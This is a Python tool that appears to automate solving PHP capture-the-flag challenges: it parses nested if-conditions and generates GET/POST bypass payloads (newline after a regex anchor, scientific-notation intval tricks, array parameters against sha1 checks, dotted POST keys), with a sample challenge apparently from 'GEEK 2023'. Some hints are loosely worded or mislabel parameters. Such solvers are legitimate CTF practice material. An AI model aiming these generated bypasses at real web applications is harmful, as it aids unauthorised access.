# -*- coding: utf-8 -*-
"""
PHP Logic Analyzer — 多层条件绕过求解器 v2
"""

import re
from typing import Dict, List, Optional

# ====================================================================
# Sub-condition bypass rules
# ====================================================================

def _rule_preg_strict_ne(cond: str) -> Optional[Dict]:
    """preg_match + strict !== bypass
    
    preg_match('/^Welcome to GEEK 2023!$/i', $_GET['syc']) && $_GET['syc'] !== 'Welcome to GEEK 2023!'
    → Add trailing newline to bypass $ anchor
    """
    m = re.search(
        r"preg_match\s*\(\s*'/\^([^^]+)\$/([a-z]*)'\s*,\s*\$_(GET|POST)\[['\"](\w+)['\"]\]",
        cond
    )
    if not m:
        return None
    expected_prefix = m.group(1)  # the part between ^ and $
    flags = m.group(2)            # flags like 'i'
    method = m.group(3)           # GET/POST
    param = m.group(4)            # param name
    
    # Check for strict !== with exact same value
    strict_m = re.search(
        rf"\$_(?:GET|POST)\[['\"]{param}['\"]\]\s*!==\s*'([^']+)'",
        cond
    )
    if not strict_m:
        return None
    
    strict_val = strict_m.group(1)
    
    # Bypass: keep the value the same but add \n at end
    # preg_match with $ matches before terminating \n (without D modifier)
    # but !== catches the \n
    return {
        'method': method,
        'param': param,
        'payload': strict_val + '\n',
        'hint': f'末尾加换行: {strict_val}[\\n]',
    }


def _rule_intval_sci(cond: str) -> Optional[Dict]:
    """intval < N && intval(+1) > M bypass (scientific notation)"""
    m = re.search(
        r"intval\s*\(\s*\$_(GET|POST)\[['\"](\w+)['\"]\s*\]\s*\)\s*<\s*(\d+)",
        cond
    )
    if not m:
        return None
    
    method = m.group(1)
    param = m.group(2)
    lt_val = int(m.group(3))
    
    # Check for the +1 > part
    m2 = re.search(
        rf"intval\s*\(\s*\$_(?:GET|POST)\[['\"]{param}['\"]\s*\]\s*\+\s*1\s*\)\s*>\s*(\d+)",
        cond
    )
    if not m2:
        return None
    
    gt_val = int(m2.group(1))
    
    # Solution: base = lt_val - 1, add exponent
    base = lt_val - 1
    for exp in range(1, 8):
        candidate = f"{base}e{exp}"
        # intval("2022e1") = 2022, but "2022e1" + 1 = "2022e1" + 1 in PHP
        # PHP converts "2022e1" to float 20220, then +1 = 20221
        if int(f"{base}{'0'*exp}") + 1 > gt_val:
            return {
                'method': method,
                'param': param,
                'payload': candidate,
                'hint': f'科学计数法绕过: intval("{candidate}")={base}<{lt_val}, intval({candidate}+1)={int(f"{base}{chr(48)*exp}")+1}>{gt_val}',
            }
    return None


def _rule_sha1_array(cond: str) -> Optional[Dict]:
    """SHA1/MD5 collision via array → 'Array' string"""
    # Pattern: sha1($array1) === sha1($array2) where $array1 = (string)$_POST['qw']
    # Or: sha1((string)$_POST['qw']) === sha1((string)$_POST['yxx'])
    m = re.search(
        r"sha1\s*\(\s*\(string\)\s*\$_(POST|GET)\[['\"](\w+)['\"]\]",
        cond
    )
    if m:
        return {
            'method': m.group(1),
            'param': m.group(2),
            'payload': '__ARRAY__',
            'hint': '数组绕过: (string)["x"] = "Array", sha1("Array") collision',
        }
    # Also match: sha1($array1) === sha1($array2) in broader context
    m2 = re.search(r"sha1\s*\(.*?\)\s*===\s*sha1", cond)
    if m2:
        return {
            'method': 'POST',
            'param': '__ARRAY_PARAMS__',
            'payload': '__ARRAY__',
            'hint': '数组绕过: qw[]=a&yxx[]=b 使 sha1("Array") 碰撞',
        }
    return None


def _rule_isset_truthy(cond: str) -> Optional[Dict]:
    """Simple isset + truthy check for POST params"""
    m = re.search(
        r"isset\s*\(\s*\$_(POST|GET)\[['\"](\w+)['\"]\]\s*\)\s*&&\s*\$_(POST|GET)\[['\"](\w+)['\"]\]\s*\)?",
        cond
    )
    if m:
        return {
            'method': m.group(1),
            'param': m.group(2),
            'payload': '__ANY__',
            'hint': f'set {m.group(2)}[]=a&{m.group(3)}[]=b (数组绕过sha1准备)',
        }
    return None


def _rule_post_key_dot(cond: str) -> Optional[Dict]:
    """POST key with dot bypass (PHP converts . to _)"""
    m = re.search(
        r"isset\s*\(\s*\$_(POST)\[['\"]([\w]+)\.(\w+)['\"]",
        cond
    )
    if m:
        prefix = m.group(2)
        suffix = m.group(3)
        return {
            'method': 'POST',
            'param': f'{prefix}[{suffix}]',
            'payload': '__POST_DOT_KEY__',
            'hint': f'PHP转换.→_ , 尝试 {prefix}[{suffix}]=xxx 嵌套数组',
        }
    return None


def _rule_assignment_cond(cond: str) -> Optional[Dict]:
    """Assignment used as boolean condition (= not ==)"""
    m = re.search(
        r"\$_(POST|GET)\[['\"]([\w.]+)['\"]\s*=\s*['\"]([^'\"]+)['\"]",
        cond
    )
    if m:
        return {
            'method': m.group(1),
            'param': m.group(2),
            'payload': m.group(3),
            'hint': f'赋值作条件: 传任意值即可',
        }
    return None


# All rules, ordered by specificity
SUB_CONDITION_RULES = [
    _rule_intval_sci,
    _rule_isset_truthy,
    _rule_preg_strict_ne,
    _rule_sha1_array,
    _rule_post_key_dot,
    _rule_assignment_cond,
]


# ====================================================================
# Main solver
# ====================================================================

def _decompose_condition(cond_text: str) -> List[str]:
    """Split a PHP if-condition by &&, respecting nesting."""
    # Handle nested parens in conditions
    parts = []
    depth = 0
    current = []
    for ch in cond_text:
        if ch == '(':
            depth += 1
            current.append(ch)
        elif ch == ')':
            depth -= 1
            current.append(ch)
        elif ch == '&' and depth == 0:
            if current and ''.join(current).strip():
                parts.append(''.join(current).strip())
            current = []
        else:
            current.append(ch)
    if current and ''.join(current).strip():
        parts.append(''.join(current).strip())
    return [p for p in parts if p and p != '&']


def extract_conditions(php_source: str) -> List[Dict]:
    """Extract if-conditions from PHP source, decomposed into sub-conditions."""
    
    # Extract each if-condition block
    # Use non-greedy match to find innermost if first
    if_pattern = re.compile(r'if\s*\((.+?)\)\s*\{', re.DOTALL)
    matches = if_pattern.findall(php_source)
    
    conditions = []
    for i, cond_raw in enumerate(matches):
        cond_clean = re.sub(r'\s+', ' ', cond_raw).strip()
        if len(cond_clean) > 300:
            cond_clean = cond_clean[:300] + '...'
        
        sub_conds = _decompose_condition(cond_raw)
        
        solutions = []
        params = set()
        
        # Extract all params
        for m in re.finditer(r"\$_(GET|POST)\[['\"](\w+(?:\.\w+)?)['\"]", cond_clean):
            params.add((m.group(1), m.group(2)))
        
        # Match each sub-condition
        for sc in sub_conds:
            for rule_fn in SUB_CONDITION_RULES:
                result = rule_fn(sc)
                if result:
                    solutions.append(result)
                    break
        
        # Also try the full condition
        if not solutions:
            for rule_fn in SUB_CONDITION_RULES:
                result = rule_fn(cond_clean)
                if result:
                    solutions.append(result)
                    break
        
        conditions.append({
            'layer': i + 1,
            'condition_raw': cond_clean,
            'sub_conditions': sub_conds,
            'params': [{'method': m, 'name': n} for m, n in params],
            'solutions': solutions,
            'solved': len(solutions) > 0,
        })
    
    return conditions


def analyze_and_solve(url: str, php_source: str,
                      fingerprint: Dict = None) -> Dict:
    """Analyze PHP source for multi-layer conditions and generate bypass payloads."""
    conditions = extract_conditions(php_source)
    
    if not conditions:
        return {
            'type': 'php_bypass',
            'conditions': [],
            'total_layers': 0,
            'solved_layers': 0,
            'get_params': {},
            'post_params': {},
            'attack_plan': [],
        }
    
    # Build combined params
    get_params = {}
    post_params = {}
    attack_plan = []
    
    for cond in conditions:
        plan_entry = {
            'layer': cond['layer'],
            'condition': cond['condition_raw'][:100],
            'bypass': None,
            'get': {},
            'post': {},
        }
        
        for sol in cond['solutions']:
            plan_entry['bypass'] = sol['hint']
            if sol['method'] == 'GET':
                get_params[sol['param']] = sol['payload']
                plan_entry['get'][sol['param']] = sol['payload']
            else:
                post_params[sol['param']] = sol['payload']
                plan_entry['post'][sol['param']] = sol['payload']
        
        if not cond['solved']:
            plan_entry['bypass'] = '⚠️ 未识别的绕过方式'
        
        attack_plan.append(plan_entry)
    
    return {
        'type': 'php_bypass',
        'conditions': conditions,
        'total_layers': len(conditions),
        'solved_layers': sum(1 for c in conditions if c['solved']),
        'get_params': get_params,
        'post_params': post_params,
        'attack_plan': attack_plan,
    }


# ====================================================================
# Test
# ====================================================================
if __name__ == '__main__':
    import json
    test_src = """<?php
if(isset($_GET['syc'])&&preg_match('/^Welcome to GEEK 2023!$/i', $_GET['syc']) && $_GET['syc'] !== 'Welcome to GEEK 2023!') {
    if (intval($_GET['lover']) < 2023 && intval($_GET['lover'] + 1) > 2024) {
        if (isset($_POST['qw']) && $_POST['yxx']) {
            $array1 = (string)$_POST['qw']; $array2 = (string)$_POST['yxx'];
            if (sha1($array1) === sha1($array2)) {
                if (isset($_POST['SYC_GEEK.2023'])&&($_POST['SYC_GEEK.2023'] = "Happy to see you!")) {
                    echo "WIN";
                }
            }
        }
    }
}
?>"""
    
    result = analyze_and_solve("http://test.com", test_src)
    print(json.dumps(result, indent=2, ensure_ascii=False))
